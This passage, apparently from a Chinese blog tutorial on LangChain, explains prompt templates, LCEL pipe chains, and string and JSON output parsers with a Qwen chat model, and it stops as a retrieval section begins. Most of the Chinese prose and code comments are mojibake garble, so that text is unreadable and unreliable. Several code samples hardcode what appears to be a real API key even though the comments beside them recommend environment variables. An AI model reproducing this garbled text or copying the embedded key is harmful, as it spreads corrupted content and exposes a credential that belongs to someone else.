    <span class="hljs-attr">target_language</span>=<span class="hljs-string">"æ³•è¯­"</span>,
    <span class="hljs-attr">text</span>=<span class="hljs-string">"ä»Šå¤©å¤©æ°”çœŸå¥½"</span>
)
print(formatted_prompt)
</code></pre>
<p>è¿™æ ·æ‹¼æ¥ä¹‹åçš„å®Œæ•´æç¤ºè¯å°±æ˜¯** ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç¿»è¯‘åŠ©æ‰‹ï¼Œè¯·å°†ä»¥ä¸‹å†…å®¹ç¿»è¯‘æˆæ³•è¯­ï¼šä»Šå¤©å¤©æ°”çœŸå¥½**</p>
<p>é‚£ä¹ˆ ChatPromptTemplate.from_template å’Œ ChatPromptTemplate.from_messages æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p>
<ul>
<li>ChatPromptTemplate.from_messages è¿™ä¸ªæ–¹æ³•æ¥æ”¶ä¸€ä¸ªæ¶ˆæ¯åˆ—è¡¨ï¼Œæ¯æ¡æ¶ˆæ¯å¯ä»¥æ˜¯å…ƒç»„å½¢å¼æˆ–ç‰¹å®šçš„æ¶ˆæ¯å¯¹è±¡ï¼ˆå¦‚ SystemMessagePromptTemplate, HumanMessagePromptTemplateï¼‰ã€‚</li>
</ul>
<p>ç”¨é€”ï¼šå½“ä½ éœ€è¦æ„å»ºä¸€ä¸ªå¤æ‚çš„ã€å¤šè½®çš„ã€è§’è‰²åˆ†æ˜çš„å¯¹è¯ç»“æ„æ—¶ä½¿ç”¨ã€‚è¿™æ˜¯æ„å»ºèŠå¤©æœºå™¨äººçš„æ ‡å‡†æ–¹å¼ã€‚ ç»“æ„ï¼šå®ƒå¯ä»¥åŒ…å«ç³»ç»Ÿæ¶ˆæ¯ï¼ˆSystemï¼‰ã€ç”¨æˆ·æ¶ˆæ¯ï¼ˆUserï¼‰ã€AI æ¶ˆæ¯ï¼ˆAssistantï¼‰ç­‰ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„å¯¹è¯ä¸Šä¸‹æ–‡ã€‚</p>
<ul>
<li>ChatPromptTemplate.from_template è¿™ä¸ªæ–¹æ³•æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²æ¨¡æ¿ï¼Œé€šå¸¸åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªç”¨å¤§æ‹¬å· {} åŒ…è£¹çš„å ä½ç¬¦ã€‚</li>
</ul>
<p>ç”¨é€”ï¼šå½“ä½ åªéœ€è¦ä¸€ä¸ªç®€å•çš„æ–‡æœ¬æ¨¡æ¿ï¼Œå¹¶ä¸”éœ€è¦åŠ¨æ€æ’å…¥å˜é‡æ—¶ä½¿ç”¨ã€‚ ç»“æ„ï¼šå®ƒç”Ÿæˆçš„æ˜¯ä¸€ä¸ªå•ä¸€çš„æ¶ˆæ¯ï¼Œé€šå¸¸é»˜è®¤æ˜¯â€œç”¨æˆ·æ¶ˆæ¯â€ï¼ˆHumanMessageï¼‰ã€‚</p>
<p>ps:åŒæ ·è¿˜æœ‰ PromptTemplateï¼šåŸºç¡€æ–‡æœ¬æ¨¡æ¿ï¼Œé€‚ç”¨äºä¼ ç»Ÿçš„â€œè¾“å…¥ä¸€æ®µæ–‡æœ¬ï¼Œè¾“å‡ºä¸€æ®µæ–‡æœ¬â€çš„æ¨¡å‹ã€‚</p>
<p>è¿™ä¸¤ä¸ªåŒºåˆ«ï¼š</p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>PromptTemplate</th><th>ChatPromptTemplate</th></tr></thead><tbody><tr><td><strong>é€‚ç”¨æ¨¡å‹ç±»å‹</strong></td><td>åŸºç¡€è¯­è¨€æ¨¡å‹ï¼ˆtext-in, text-outï¼‰</td><td>èŠå¤©æ¨¡å‹ï¼ˆchat modelsï¼‰</td></tr><tr><td><strong>è¾“å‡ºæ ¼å¼</strong></td><td>æ™®é€šæ–‡æœ¬å­—ç¬¦ä¸²</td><td>æ¶ˆæ¯å¯¹è±¡åˆ—è¡¨ï¼ˆå¦‚ <code>HumanMessage</code>, <code>AIMessage</code> ç­‰ï¼‰</td></tr><tr><td><strong>ç»“æ„åŒ–ç¨‹åº¦</strong></td><td>ç®€å•æ¨¡æ¿ï¼Œé€‚åˆå•è½®</td><td>æ”¯æŒå¤šè½®å¯¹è¯ã€ç³»ç»Ÿæ¶ˆæ¯ã€è§’è‰²åŒºåˆ†</td></tr><tr><td><strong>æ˜¯å¦æ”¯æŒè§’è‰²</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒï¼š<code>system</code>, <code>human</code>, <code>ai</code></td></tr><tr><td><strong>å…¸å‹ç”¨é€”</strong></td><td>æ–‡æœ¬è¡¥å…¨ã€å†…å®¹ç”Ÿæˆ</td><td>èŠå¤©æœºå™¨äººã€å¤šè½®å¯¹è¯ã€API è°ƒç”¨ï¼ˆå¦‚ GPT, Qwenï¼‰</td></tr></tbody></table>
<h4 data-id="heading-11">5ã€langchain è¡¨è¾¾å¼ï¼ˆLCELï¼‰å’Œè¾“å‡ºè§£æå™¨</h4>
<p>LCEL æŒ‡çš„æ˜¯ LangChain Expression Languageï¼Œå®ƒæ˜¯ LangChain æ¡†æ¶ä¸­ä¸€ç§å£°æ˜å¼ã€å¯ç»„åˆçš„æ–¹å¼æ¥æ„å»ºå’Œè¿è¡Œé“¾ï¼ˆchainsï¼‰ã€‚ LCEL æ˜¯ LangChain æ¨èçš„æ ¸å¿ƒç¼–ç¨‹èŒƒå¼ï¼Œæ—¨åœ¨è®©å¼€å‘è€…èƒ½å¤Ÿä»¥ç®€æ´ã€æ¸…æ™°ã€å¥å£®ä¸”å¯è§‚å¯Ÿçš„æ–¹å¼å°†ä¸åŒçš„ç»„ä»¶ï¼ˆå¦‚æç¤ºæ¨¡æ¿ã€è¯­è¨€æ¨¡å‹ã€è¾“å‡ºè§£æå™¨ã€å·¥å…·ç­‰ï¼‰è¿æ¥èµ·æ¥ï¼Œå½¢æˆå¤„ç†æ•°æ®çš„â€œé“¾â€ã€‚</p>
<p>langchain è¡¨è¾¾å¼çš„æ ¸å¿ƒç‰¹ç‚¹ï¼š</p>
<ul>
<li>å£°æ˜å¼ï¼ˆDeclarativeï¼‰ï¼Œå¯ä»¥é€šè¿‡åƒé“¾æ¡é‚£æ ·ç»„åˆèµ·æ¥</li>
</ul>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å£°æ˜ä¸€ä¸ªé“¾ï¼šæç¤º -&gt; æ¨¡å‹ -&gt; è¾“å‡ºè§£æå™¨</span>
<span class="hljs-attr">chain</span> = prompt | model | parser
</code></pre>
<ul>
<li>
<p>å¯ç»„åˆï¼ˆComposableï¼‰:ä»»ä½•å®ç°äº† Runnable æ¥å£çš„å¯¹è±¡éƒ½å¯ä»¥é€šè¿‡ | æ“ä½œç¬¦è¿›è¡Œç»„åˆï¼Œå°±åƒæ­ç§¯æœ¨ä¸€æ ·ã€‚</p>
</li>
<li>
<p>å¼€ç®±å³ç”¨çš„åŠŸèƒ½</p>
<ul>
<li>æµå¼è¾“å‡ºï¼ˆStreamingï¼‰ï¼šå¯ä»¥å®æ—¶æ¥æ”¶æ¨¡å‹è¾“å‡ºçš„ tokenã€‚</li>
<li>å¼‚æ­¥è°ƒç”¨ï¼ˆAsyncï¼‰ï¼šæ”¯æŒ async/await è¯­æ³•ã€‚</li>
<li>æ‰¹é‡å¤„ç†ï¼ˆBatchingï¼‰ï¼šå¯ä»¥é«˜æ•ˆå¤„ç†å¤šä¸ªè¾“å…¥ã€‚</li>
<li>å‡½æ•°è°ƒç”¨ï¼ˆFunction Callingï¼‰ï¼šåŸç”Ÿæ”¯æŒå·¥å…·è°ƒç”¨ã€‚</li>
<li>å¯è§‚å¯Ÿæ€§ï¼ˆObservabilityï¼‰ï¼šå¯ä»¥è½»æ¾ç›‘æ§é“¾ä¸­æ¯ä¸ªæ­¥éª¤çš„æ‰§è¡Œæƒ…å†µï¼Œä¾¿äºè°ƒè¯•ã€‚</li>
</ul>
</li>
<li>
<p>langchain è¡¨è¾¾å¼çš„åŸºæœ¬ä½¿ç”¨</p>
<ul>
<li>æˆ‘ä»¬æ¥ç€åœ¨ä¸Šé¢çš„æµ‹è¯•ä»£ç ä¸­ä¿®æ”¹ï¼ˆä½¿ç”¨ langchian è¡¨è¾¾å¼ï¼‰</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">      <span class="hljs-comment"># æˆ‘ä»¬ä½¿ç”¨é˜¿é‡Œäº‘çš„qwenå¤§æ¨¡å‹ï¼Œå¯¼å…¥æ ¸å¿ƒåŒ…</span>
  from langchain_community.chat_models import ChatTongyi
  from langchain_core.prompts import ChatPromptTemplate

  <span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªllmå¯¹è±¡</span>
  <span class="hljs-attr">llm</span> = ChatTongyi(
      <span class="hljs-attr">model</span>=<span class="hljs-string">"qwen-plus"</span>,
      <span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>,  <span class="hljs-comment"># å»ºè®®ä½¿ç”¨ç¯å¢ƒå˜é‡ç®¡ç†å¯†é’¥</span>
  )

  <span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
  <span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_messages([
      (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€åä¸“ä¸šçš„ç¿»è¯‘å®¶ï¼Œå¯ä»¥å°†ç”¨æˆ·çš„ä¸­æ–‡ç¿»è¯‘ä¸ºè‹±æ–‡ã€‚"</span>),
      (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{text}"</span>),  <span class="hljs-comment"># ä½¿ç”¨å˜é‡å ä½ç¬¦</span>
  ])

  <span class="hljs-comment"># å°†æç¤ºè¯æ¨¡æ¿é€šè¿‡ç±»ä¼¼äºunixä¸­ç®¡é“ç¬¦çš„å½¢å¼ï¼Œä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ é€’ç»™llmï¼Œè¿™å°±æ˜¯ä¸€ä¸ªlangchainè¡¨è¾¾å¼</span>
  <span class="hljs-attr">chain</span> = prompt | llm

  <span class="hljs-comment"># ä½¿ç”¨æˆ‘ä»¬åˆšæ‰å®šä¹‰å¥½çš„ä¸€ä¸ªchainè°ƒç”¨è¿è°ƒç”¨å¤§æ¨¡å‹ï¼Œå°†æˆ‘ä»¬åˆšæ‰å®šä¹‰çš„å ä½ç¬¦è®¾ç½®å®é™…çš„å€¼</span>
  <span class="hljs-attr">res</span> = chain.invoke({<span class="hljs-string">"text"</span>: <span class="hljs-string">"æˆ‘æ˜¯ä¸€åä¼˜ç§€çš„Javaå¼€å‘å·¥ç¨‹å¸ˆ"</span>})

  <span class="hljs-comment"># è¾“å‡ºç»“æœ,è¿™é‡Œç›´æ¥æ‹¿åˆ°aiå›å¤çš„contentå†…å®¹</span>
  print(res.content)
</code></pre>
<p>æ§åˆ¶å°è¾“å‡ºï¼š</p>
<pre><code class="hljs language-css" lang="css">  <span class="hljs-selector-tag">I</span> am an excellent Java development engineer.
  Process finished with exit <span class="hljs-selector-tag">code</span> <span class="hljs-number">0</span>
</code></pre>
<p>åŒæ—¶è¿˜æ”¯æŒæµå¼è¾“å‡º,ä½¿ç”¨ for å¾ªç¯æ–¹å¼</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> chain.stream({<span class="hljs-string">"text"</span>: <span class="hljs-string">"æˆ‘æ˜¯ä¸€åä¼˜ç§€çš„Javaå¼€å‘å·¥ç¨‹å¸ˆ"</span>}):
  <span class="hljs-built_in">print</span>(chunk, <span class="hljs-keyword">end</span>=<span class="hljs-string">""</span>)
</code></pre>
<p>æˆ‘ä»¬é€šè¿‡è¿™æ · langchain è¡¨è¾¾å¼çš„æ–¹å¼å¯ä»¥è°ƒç”¨å¤§æ¨¡å‹ç”Ÿæˆå†…å®¹ã€‚</p>
<p>åˆšæ‰æ˜¯åŸºæœ¬ä½¿ç”¨ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ„å»ºæ›´å¤æ‚çš„å¸¦å‚æ•°çš„é“¾</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> langchain_core.<span class="hljs-property">runnables</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">RunnablePassthrough</span>
</code></pre>
</li>
</ul>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¸¦æœ‰å˜é‡æ³¨å…¥çš„é“¾</span>

<span class="hljs-attr">chain</span> = (
{"context": retriever, "question": RunnablePassthrough()}
| prompt
| model
| output_parser
)

<span class="hljs-attr">result</span> = chain.invoke(<span class="hljs-string">"LangChain æ˜¯ä»€ä¹ˆï¼Ÿ"</span>)
</code></pre>
<p>åœ¨åˆšæ‰çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå¸¦å‚æ•°çš„é“¾ï¼Œå…¶ä¸­ <strong>{"context": retriever, "question": RunnablePassthrough()}</strong> ä¸­çš„ context å…¶å®æ˜¯åœ¨å’Œ ai å¯¹è¯çš„æ—¶å€™çš„ä¸Šä¸‹æ–‡ï¼Œretriever æ˜¯åœ¨å‘é‡æ•°æ®åº“ä¸­æ£€ç´¢åçš„ä¿¡æ¯ï¼ŒRunnablePassthrough()çš„ä½œç”¨æ˜¯â€œè®©è¾“å…¥åŸå°ä¸åŠ¨åœ°é€šè¿‡â€ï¼Œä¸åšä»»ä½•å¤„ç†ï¼Œç›´æ¥ä¼ é€’ç»™ä¸‹ä¸€ä¸ªç»„ä»¶ã€‚æ•°æ®è¿›æ¥æ˜¯ä»€ä¹ˆæ ·ï¼Œå‡ºå»è¿˜æ˜¯ä»€ä¹ˆæ ·ã€‚è¿™äº›æˆ‘ä»¬ä¹‹åä¼šè®²åˆ°</p>
<p>ç°åœ¨è¦è¯´çš„æ˜¯è¿™ä¸ª<strong>output_parser</strong>ä¹Ÿå°±æ˜¯è¾“å‡ºè§£æå™¨</p>
<p>é‚£ä»€ä¹ˆæ˜¯è¾“å‡ºè§£æå™¨å‘¢ï¼Ÿ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å¯¹ llm çš„è¾“å‡ºè¿›è¡Œè§£æçš„ï¼Œåœ¨ä¸Šé¢ä¸€å¼€å§‹è°ƒç”¨ llm çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä»–çš„è¾“å‡ºæ˜¯ä¸€å †çš„ json å­—ç¬¦ä¸²ï¼Œæ— è®ºæ˜¯å¯¹å¼€å‘è€…è¿˜æ˜¯è¯´ç”¨æˆ·æ¥è¯´éƒ½éå¸¸çš„ä¸å‹å¥½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ llm åŸå§‹çš„è¾“å‡ºè¿›è¡Œè§£é‡Šï¼ŒæŠŠå®é™…ä¸ŠçœŸæ­£å¯¹æˆ‘ä»¬æœ‰ç”¨çš„ä¿¡æ¯æ‹¿åˆ°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰<strong>res.content</strong>çš„å†…å®¹</p>
<p>åœ¨<strong>langchain.output_parsers</strong>åŒ…ä¸‹é¢ï¼Œæœ‰è®¸å¤šçš„è¾“å‡ºè§£æå™¨ï¼Œ åŒ…æ‹¬è¿™å‡ ç§è§£æå™¨ <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7cb887a1e054945a24590b07a666b5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=5qmdNfeITARFcybNolYhSMB%2BN4A%3D" alt="" loading="lazy"/> åŒæ ·è¿˜æœ‰ä¸€ä¸ªæˆ‘ä»¬ç”¨åˆ°çš„æœ€å¤šçš„å­—ç¬¦ä¸²è§£æå™¨ï¼Œæˆ‘ä»¬è¿™ä¸ªé¡¹ç›®ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªå­—ç¬¦ä¸²è§£æå™¨</p>
<ul>
<li>
<p>å­—ç¬¦ä¸²è§£æå™¨</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.output_parsers import StrOutputParser
<span class="hljs-attr">parser</span> = StrOutputParser()
</code></pre>
<p>è¿ç”¨åˆ°æˆ‘ä»¬åˆšæ‰çš„æµ‹è¯•æ–‡ä»¶ä¸­</p>
<pre><code class="hljs language-ini" lang="ini">    <span class="hljs-comment"># æˆ‘ä»¬ä½¿ç”¨é˜¿é‡Œäº‘çš„qwenå¤§æ¨¡å‹ï¼Œå¯¼å…¥æ ¸å¿ƒåŒ…</span>
  from langchain_community.chat_models import ChatTongyi
  from langchain_core.output_parsers import StrOutputParser
  from langchain_core.prompts import ChatPromptTemplate

  <span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªllmå¯¹è±¡</span>
  <span class="hljs-attr">llm</span> = ChatTongyi(
      <span class="hljs-attr">model</span>=<span class="hljs-string">"qwen-plus"</span>,
      <span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>,  <span class="hljs-comment"># å»ºè®®ä½¿ç”¨ç¯å¢ƒå˜é‡ç®¡ç†å¯†é’¥</span>
  )

  <span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
  <span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_messages([
      (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€åä¸“ä¸šçš„ç¿»è¯‘å®¶ï¼Œå¯ä»¥å°†ç”¨æˆ·çš„ä¸­æ–‡ç¿»è¯‘ä¸ºè‹±æ–‡ã€‚"</span>),
      (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{text}"</span>),  <span class="hljs-comment"># ä½¿ç”¨å˜é‡å ä½ç¬¦</span>
  ])

  <span class="hljs-attr">parser</span> = StrOutputParser()

  <span class="hljs-comment"># å°†æç¤ºè¯æ¨¡æ¿é€šè¿‡ç±»ä¼¼äºunixä¸­ç®¡é“ç¬¦çš„å½¢å¼ï¼Œä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ é€’ç»™llm,åœ¨è¿™é‡Œæˆ‘ä»¬åœ¨åŸæ¥çš„é“¾ä¸ŠåŠ äº†ä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºè§£æå™¨</span>
  <span class="hljs-attr">chain</span> = prompt | llm | parser

  <span class="hljs-comment"># ä½¿ç”¨æˆ‘ä»¬åˆšæ‰å®šä¹‰å¥½çš„ä¸€ä¸ªchainè°ƒç”¨è¿è°ƒç”¨å¤§æ¨¡å‹ï¼Œå°†æˆ‘ä»¬åˆšæ‰å®šä¹‰çš„å ä½ç¬¦è®¾ç½®å®é™…çš„å€¼</span>
  <span class="hljs-attr">res</span> = chain.invoke({<span class="hljs-string">"text"</span>: <span class="hljs-string">"æˆ‘æ˜¯ä¸€åä¼˜ç§€çš„Javaå¼€å‘å·¥ç¨‹å¸ˆ"</span>})
  <span class="hljs-comment"># ç›´æ¥æ‰“å°res</span>
  print(res)
</code></pre>
<p>è¿™æ—¶å€™æˆ‘ä»¬å‘ç°ï¼Œå³ä½¿æˆ‘ä»¬æ²¡æœ‰è°ƒç”¨ res.content,è¾“å‡ºçš„ä¹Ÿä»…ä»…æœ‰æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ä¸€å † json å­—ç¬¦ä¸²</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">I</span> am an excellent Java development engineer.

Process finished with exit <span class="hljs-selector-tag">code</span> <span class="hljs-number">0</span>
</code></pre>
<ul>
<li>json è§£æå™¨</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">from langchain_core.output_parsers import JsonOutputParser
<span class="hljs-attr">parser</span> = JsonOutputParser(pydantic_object=TranslationResult)
</code></pre>
<p>ä¸‹é¢æ”¹é€ æˆ‘ä»¬çš„æµ‹è¯•ä»£ç </p>
<pre><code class="hljs language-ini" lang="ini"> Â  Â from langchain_community.chat_models import ChatTongyi
 Â  Â from langchain_core.output_parsers import JsonOutputParser
 Â  Â from langchain_core.prompts import ChatPromptTemplate
 Â  Â from langchain_core.pydantic_v1 import BaseModel, Field Â <span class="hljs-comment"># æ³¨æ„ä½¿ç”¨ pydantic v1 å…¼å®¹æ ¼å¼</span>
â€‹
 Â  Â <span class="hljs-comment"># å®šä¹‰æœŸæœ›çš„è¾“å‡ºç»“æ„ï¼ˆPydantic æ¨¡å‹ï¼‰</span>
 Â  Â class TranslationResult(BaseModel):
 Â  Â  Â source: <span class="hljs-attr">str</span> = Field(description=<span class="hljs-string">"åŸå§‹ä¸­æ–‡æ–‡æœ¬"</span>)
 Â  Â  Â translated: <span class="hljs-attr">str</span> = Field(description=<span class="hljs-string">"ç¿»è¯‘åçš„è‹±æ–‡æ–‡æœ¬"</span>)
â€‹
 Â  Â <span class="hljs-comment"># åˆå§‹åŒ– LLM</span>
 Â  Â <span class="hljs-attr">llm</span> = ChatTongyi(
 Â  Â  Â <span class="hljs-attr">model</span>=<span class="hljs-string">"qwen-plus"</span>,
 Â  Â  Â <span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>, Â <span class="hljs-comment"># å»ºè®®ä½¿ç”¨ç¯å¢ƒå˜é‡ç®¡ç†</span>
 Â   )
â€‹
 Â  Â <span class="hljs-comment"># åˆ›å»º JsonOutputParserï¼Œä¼ å…¥æˆ‘ä»¬å®šä¹‰çš„æ¨¡å‹</span>
 Â  Â <span class="hljs-attr">parser</span> = JsonOutputParser(pydantic_object=TranslationResult)
â€‹
 Â  Â <span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
 Â  Â <span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_messages([
 Â  Â   (<span class="hljs-string">"system"</span>, <span class="hljs-string">"""ä½ æ˜¯ä¸€åä¸“ä¸šçš„ç¿»è¯‘å®¶ã€‚è¯·å°†ç”¨æˆ·æä¾›çš„ä¸­æ–‡å¥å­å‡†ç¡®ç¿»è¯‘ä¸ºè‹±æ–‡ã€‚
 Â   ä½ çš„è¾“å‡ºå¿…é¡»æ˜¯ JSON æ ¼å¼ï¼Œå¹¶ä¸”åŒ…å«ä¸¤ä¸ªå­—æ®µï¼š
 Â   ```
â€‹
  - source: åŸå§‹ä¸­æ–‡æ–‡æœ¬
  - translated: å¯¹åº”çš„è‹±æ–‡ç¿»è¯‘
â€‹
  {format_instructions}"""</span>),
  (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{text}"</span>)
  ]).partial(format_instructions=parser.get_format_instructions()) <span class="hljs-comment"># è‡ªåŠ¨æ³¨å…¥æ ¼å¼è¯´æ˜</span>
â€‹
 Â <span class="hljs-comment"># æ„å»ºé“¾</span>
â€‹
 Â <span class="hljs-attr">chain</span> = prompt | llm | parser
â€‹
 Â <span class="hljs-comment"># è°ƒç”¨é“¾</span>
â€‹
 Â <span class="hljs-attr">res</span> = chain.invoke({<span class="hljs-string">"text"</span>: <span class="hljs-string">"æˆ‘æ˜¯ä¸€åä¼˜ç§€çš„ Java å¼€å‘å·¥ç¨‹å¸ˆ"</span>})
â€‹
 Â <span class="hljs-comment"># æ‰“å°ç»“æ„åŒ–ç»“æœ</span>
â€‹
 Â print(res)
</code></pre>
</li>
</ul>
<p>æ§åˆ¶å°è¾“å‡ºç»“æœå¦‚ä¸‹</p>
<pre><code class="hljs language-arduino" lang="arduino">  {<span class="hljs-string">'source'</span>: <span class="hljs-string">'æˆ‘æ˜¯ä¸€åä¼˜ç§€çš„Javaå¼€å‘å·¥ç¨‹å¸ˆ'</span>, <span class="hljs-string">'translated'</span>: <span class="hljs-string">'I am an excellent Java development engineer'</span>}

  <span class="hljs-built_in">Process</span> finished with exit code <span class="hljs-number">0</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e8052d180694a10acfe2ae00292cb51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=PwVSsrqiXeLVCmJfph89nH%2FDCXk%3D" alt="" loading="lazy"/> psï¼š å…¶ä¸­çš„<strong>Pydantic</strong> å°±æ˜¯ä¸€ä¸ªåŸºäº <strong>Python</strong> ç±»å‹æç¤ºçš„æ•°æ®éªŒè¯åº“ï¼Œä¸»è¦ç”¨äºæ•°æ®éªŒè¯å’Œæ¨¡å‹å®šä¹‰ã€‚å®ƒåˆ©ç”¨ Python çš„ç±»å‹æ³¨è§£æ¥å®šä¹‰æ•°æ®ç»“æ„ï¼Œç„¶ååœ¨æ•°æ®è¿›å…¥ç³»ç»Ÿå‰è¿›è¡ŒéªŒè¯ï¼Œç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ã€‚ å®ƒä¼šé€šè¿‡ç»§æ‰¿ <strong>pydantic.BaseModel</strong> åˆ›å»ºæ•°æ®æ¨¡å‹</p>
<p>ä½¿ç”¨è¿™ç§è§£æå™¨ï¼Œå°±æœ‰ä¸€ç§ç±»ä¼¼äºç»“æ„åŒ–è¾“å‡ºçš„æ•ˆæœï¼Œå½“ç„¶ä¹Ÿæœ‰ä¸€ä¸ªç»“æ„åŒ–è¾“å‡ºè§£æå™¨<strong>from langchain.output_parsers import StructuredOutputParser</strong></p>
<p>é‚£ç»“æ„åŒ–è¾“å‡ºåˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸‹é¢è¿™ä¸€ä¸ª prompt</p>
<pre><code class="hljs language-shell" lang="shell">  ä½ æ˜¯ä¸€åä¼˜ç§€çš„æ•°æ®åˆ†æå¸ˆï¼Œæ¥ä¸‹æ¥ä½ è¦æ ¹æ®æˆ‘ç»™ä½ çš„æ•°æ®ï¼ˆcsvæ–‡ä»¶ï¼‰åˆ†æè¿™äº›æ•°æ®ï¼Œå¹¶ä½¿ç”¨echartsä»£ç ç»™æˆ‘å®ç°å¯è§†åŒ–ã€‚ä½ å¿…é¡»æŒ‰ç…§ä¸‹é¢çš„ç»“æ„è¿”å›
  ----- è¿™é‡Œæ”¾åˆ†æçš„ç»“æœ -----
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">#### è¿™é‡Œæ”¾echartsä»£ç  #####</span></span>
</code></pre>
<p>æˆ‘ä»¬ä½¿ç”¨**-----** å’Œ <strong>#####</strong> ç”¨æ¥æŠŠæˆ‘ä»¬éœ€è¦çš„å†…å®¹åŒ…è£¹ä¸€ä¸‹ï¼Œä»¥ä¾¿äºæˆ‘ä»¬åç»­çš„æå–æ“ä½œã€‚é‚£å¦‚æœæˆ‘ä»¬ä¸è¿™ä¹ˆå†™å‘¢ï¼Œæ˜¯ä¸æ˜¯ AI ç”Ÿæˆçš„å°±ä¸å¯æ§äº†ï¼Œæˆ‘ä»¬æƒ³è¦æå–ä¹Ÿæ˜¯éå¸¸å›°éš¾ï¼Œæ‰€ä»¥å°±æœ‰äº†ç»“æ„åŒ–è¾“å‡ºè§£æå™¨ï¼Œç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„æ ‡å‡†ã€‚</p>
<p>å½“ç„¶è¿˜æœ‰å…¶ä»–çš„è§£æå™¨ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨ä¸Šé¢æåˆ°çš„æšä¸¾è§£æå™¨ï¼Œåˆ—è¡¨è§£æå™¨ç­‰ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å°±ä¸ä¸€ä¸€ä»‹ç»ã€‚</p>
<h4 data-id="heading-12">6ã€æ£€ç´¢</h4>
<p>ä»€ä¹ˆæ˜¯æ£€ç´¢ï¼Ÿæƒ³è±¡æˆ‘ä»¬åœ¨å†™ Java é¡¹ç›®çš„æ—¶å€™ï¼Œçªç„¶å¿˜äº†ä¸€ä¸ª API çš„ä½¿ç”¨æ–¹æ³•ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å»æŸ¥å®˜æ–¹æ–‡æ¡£ï¼Œè¿™å°±æ˜¯æ£€ç´¢ï¼ŒåŒ…æ‹¬æˆ‘ä»¬ä½¿ç”¨æœç´¢å¼•æ“å»æœä¸œè¥¿ã€‚ LangChain ä¹Ÿæä¾›äº† llm çš„æ£€ç´¢åŠŸèƒ½ï¼Œè®© llm å»æ ¹æ®ç°æœ‰çš„æ–‡æ¡£å»æœç´¢å’Œç”¨æˆ·é—®é¢˜ç›¸å…³çš„ä¿¡æ¯ï¼Œç„¶åé€šè¿‡æ•´ç†ï¼Œå†ç»™ç”¨æˆ·å›å¤ã€‚</p>
